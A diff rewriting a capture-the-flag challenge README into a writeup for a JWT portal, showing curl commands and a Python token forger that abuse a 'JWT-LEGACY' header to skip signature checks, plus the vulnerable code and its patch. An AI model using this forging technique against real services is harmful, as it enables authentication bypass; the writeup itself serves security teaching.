@@ -1,114 +1,86 @@
-# JWT Identity Portal - Hack & Shield A&D Challenge
+# Service 8 — JWT Identity Portal: Writeup
 
-## Service Description
-The **Internal Auth API** (`v1.5.0`) is a simulated corporate Single Sign-On (SSO) dashboard that issues and validates JSON Web Tokens (JWT) for internal microservices.
+## 1. Service Number and Name
+**Service 8 — Internal Auth API** (JWT Identity Portal)
+A simulated corporate SSO portal that issues and validates JSON Web
+Tokens (JWTs) for internal microservices, running on port `8008`.
 
-**The Vulnerability:** The service contains a **Header-Triggered Signature Verification Bypass** combined with **Multi-Claim Privilege Escalation**. By default, all tokens with a standard `"typ": "JWT"` header undergo strict `HS256` cryptographic verification. However, a legacy SSO compatibility branch inside `build_decode_options()` disables signature verification when `mode="portal"` and the token header specifies `"typ": "JWT-LEGACY"`.
+---
 
-## What to Expect (Service Flow)
-When the service is running, it exposes the following endpoints:
-* `GET /api/token` - Issues a signed employee JWT (`role: "employee"`, `clearance: 1`, `aud: "employee-portal"`).
-* `GET /api/verify` - Strictly validates a token's signature and returns its decoded payload.
-* `GET /api/admin/flag` - Protected administrative endpoint requiring a Bearer token that passes both `decode_portal_token()` and `validate_admin_claims()`.
-* `GET /api/admin/` - Web UI portal equivalent for submitting administrative tokens.
+## 2. How to Exploit It — Step by Step
 
-## Local Setup & Deployment
-Run these commands from the project root to start the service:
-
+**Step 1 — Get a baseline token**
 ```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-python app.py
+curl -s http://<target>:8008/api/token | jq
 ```
-*The service listens on `http://127.0.0.1:5001`.*
+Decode it (jwt.io or any JWT decoder) and look at the header and payload:
+```json
+// header
+{ "alg": "HS256", "typ": "JWT" }
+// payload
+{ "sub": "employee_01", "role": "employee", "clearance": 1,
+  "iss": "Internal Auth API", "aud": "employee-portal", "exp": ... }
+```
+
+**Step 2 — Confirm the obvious attempt fails**
+```bash
+EMP=$(curl -s http://<target>:8008/api/token | jq -r .token)
+curl -s -H "Authorization: Bearer $EMP" http://<target>:8008/api/admin/flag
+```
+→ `403 Insufficient privileges`. A normal employee token, even with a signature that checks out, doesn't have `role: admin`.
+
+**Step 3 — Forge an admin token with a different header `typ`**
+```bash
+python3 - <<'EOF'
+import jwt, time
+payload = {
+    "sub": "admin_user",
+    "role": "admin",
+    "clearance": 5,
+    "iss": "Internal Auth API",
+    "aud": "internal-admin",
+    "exp": int(time.time()) + 999999999,
+}
+headers = {"typ": "JWT-LEGACY", "alg": "HS256"}
+print(jwt.encode(payload, "any-key-you-like", algorithm="HS256", headers=headers))
+EOF
+```
+
+**Step 4 — Submit it**
+```bash
+FORGED="<token from step 3>"
+curl -s -H "Authorization: Bearer $FORGED" http://<target>:8008/api/admin/flag
+```
+**Result:**
+```json
+{"flag":"HS{jwt_legacy_header_claim_escalation}","message":"Administrator authenticated"}
+```
 
 ---
 
-## Attack Phase (Red Team) — Conceptual Walkthrough
-The goal of the Red Team is to analyze the authentication logic, identify how legacy tokens are processed, and satisfy the administrative claim checks to retrieve the flag.
+## 3. Why the Service Is Exploitable
 
-### Step 1: Endpoint & Token Reconnaissance
-Inspect the service endpoints via `/api/help` and request a baseline token from `/api/token`. Decoding a standard employee token reveals the baseline structure:
+A JWT's trustworthiness comes entirely from its **signature** — a hash of the header and payload computed with a secret key only the server knows. If the signature doesn't match, nothing in the token can be trusted, because an attacker could have written any header or payload they wanted.
 
-**Standard Header:**
-```json
-{
-  "alg": "HS256",
-  "typ": "JWT"
-}
-```
-
-**Standard Payload:**
-```json
-{
-  "sub": "employee_01",
-  "role": "employee",
-  "clearance": 1,
-  "iss": "Internal Auth API",
-  "aud": "employee-portal",
-  "iat": 1730000000,
-  "exp": 1730007200
-}
-```
-
-Attempting to modify `"role": "admin"` on a standard token and submitting it to `/api/admin/` or `/api/admin/flag` fails with a `401` error because `DEFAULT_DECODE_OPTIONS` enforces `"verify_signature": True`.
-
-### Step 2: Source Code Audit (Identifying the Header Bypass)
-Reviewing `app.py` reveals a difference between how `/api/verify` and the admin endpoints decode tokens:
-* `/api/verify` calls `decode_token_strict()`, which passes `mode="strict"` to `build_decode_options()`.
-* `/api/admin/` and `/api/admin/flag` call `decode_portal_token()`, which inspects the unverified JWT header (`jwt.get_unverified_header(token)`) and passes `mode="portal"` to `build_decode_options()`.
-
-Inside `build_decode_options()`, if `mode == "portal"` and the header's `typ` field is set to `"JWT-LEGACY"`, the decoder overrides `options["verify_signature"] = False`.
-
-### Step 3: Satisfying Multi-Claim Validation
-Bypassing signature verification via the header alone is not sufficient. Both admin endpoints pass the decoded claims into `validate_admin_claims(claims)` and verify required fields defined in `DEFAULT_DECODE_OPTIONS`. To pass all checks, a token must contain:
-
-**Required Header Structure:**
-```json
-{
-  "alg": "HS256",
-  "typ": "JWT-LEGACY"
-}
-```
-
-**Required Payload Claims:**
-```json
-{
-  "sub": "admin_user",
-  "role": "admin",
-  "clearance": 5,
-  "iss": "Internal Auth API",
-  "aud": "internal-admin",
-  "exp": 1999999999
-}
-```
-* `role` must equal `"admin"`.
-* `aud` must be changed from `"employee-portal"` to `"internal-admin"`.
-* `clearance` must be an integer greater than or equal to `5`.
-* `iss` must remain `"Internal Auth API"`, and `exp` must be a valid future Unix timestamp.
-
-### Step 4: Retrieving the Flag
-When a JWT encoded with the `"typ": "JWT-LEGACY"` header and the escalated administrative claims is submitted to the service:
-1. **Via the Web Portal:** Paste the token into the form at `http://127.0.0.1:5001/api/admin/` and click **Verify JWT & Authenticate**.
-2. **Via the API:** Send the token in the `Authorization: Bearer <token>` HTTP header to `GET /api/admin/flag`.
-
-Once both `decode_portal_token()` and `validate_admin_claims()` succeed, the service responds with:
-`{"flag": "HNS{jwt_legacy_header_claim_escalation}", "message": "Administrator authenticated"}`
-
----
-
-## Defense Phase (Blue Team)
-Your goal as a defender is to patch the legacy compatibility bypass in `app.py` so unverified tokens are never accepted, while keeping legitimate employee token generation and verification intact.
-
-### Step 1: Locate the Flaw
-Open `app.py` and inspect `build_decode_options(token_header, mode="strict")`. Notice how the `JWT-LEGACY` condition mutates the `options` dictionary to disable signature verification for portal endpoints.
-
-### Step 2: Apply the Patch
-Remove the legacy override inside `build_decode_options()` so that `DEFAULT_DECODE_OPTIONS` (which enforces `"verify_signature": True`) is always used regardless of the `typ` header.
-
-**Vulnerable Code:**
+The bug is here, in `build_decode_options()`:
 ```python
+if mode == "portal" and token_header.get("typ") == "JWT-LEGACY":
+    options["verify_signature"] = False
+```
+This reads the token's own `typ` header — a value the *attacker controls*, since they're the one writing the token — and uses it to decide whether to check the signature at all. Set `typ` to `"JWT-LEGACY"` and the server stops verifying the signature entirely. Once that check is off, the payload is free-form: `role: admin`, `clearance: 5`, `aud: internal-admin` — whatever `validate_admin_claims()` wants to see.
+
+The deeper issue: **the server let untrusted data (the token) decide how much scrutiny that same untrusted data would receive.** The header and payload are both just text the attacker typed; none of it means anything until a signature — computed with a secret the attacker doesn't have — proves the server actually issued it.
+
+---
+
+## 4. How to Patch It
+
+**File:** `app.py`
+**Function:** `build_decode_options(token_header, mode="strict")`
+
+Delete the legacy bypass:
+```python
+# BEFORE (vulnerable)
 def build_decode_options(token_header, mode="strict"):
     options = dict(DEFAULT_DECODE_OPTIONS)
 
@@ -118,28 +90,25 @@ def build_decode_options(token_header, mode="strict"):
 
     return options
 ```
-
-**Patched Code:**
 ```python
+# AFTER (patched)
 def build_decode_options(token_header, mode="strict"):
     options = dict(DEFAULT_DECODE_OPTIONS)
     return options
 ```
 
-*(Alternatively, update `decode_portal_token()` to call `decode_token_strict(token)` directly).*
+Every token — regardless of its `typ` claim — now goes through
+`DEFAULT_DECODE_OPTIONS`, which sets `"verify_signature": True`.
 
-### Step 3: Verify the Fix (SLA Check)
-Restart the Flask server and run the automated test suite from the project root to confirm all service checks pass:
+**Verify:**
+1. Re-run Step 3/4 above → should now return `401 Invalid token`.
+2. Confirm legitimate flows still work: `/api/token` → `/api/verify` should still return `"valid": true` for a normal employee token.
 
-```bash
-source .venv/bin/activate
-python -m pytest -v
-```
+---
 
-You can also verify manually that normal employee tokens still validate properly:
-```bash
-NORMAL_TOKEN=$(curl -s http://127.0.0.1:5001/api/token | jq -r .token)
+## 5. What You Learn
 
-curl -s http://127.0.0.1:5001/api/verify?token=$NORMAL_TOKEN
-```
-**Expected Output:** `{"claims":{...},"valid":true}`
+- **A signature exists to make the token tamper-evident.** Any field read from a token *before* the signature is verified — including the header — must be treated as attacker-controlled, not as a trusted instruction.
+- **Never let untrusted input decide its own validation strength.** A conditional that *weakens* a security check based on a value the attacker supplies is, functionally, a backdoor with an unlock password the attacker can set themselves.
+- **"Legacy compatibility" code is a common place bugs hide.** Migration shims and backward-compatibility branches are frequently added under time pressure and rarely revisited — audit them with the same scrutiny as new code.
+- **Defense in depth matters, but order matters more.** Even with `validate_admin_claims()` checking multiple fields (`role`, `aud`, `clearance`), none of those checks matter once the signature check — the one thing that proves the claims weren't just invented — is skipped.
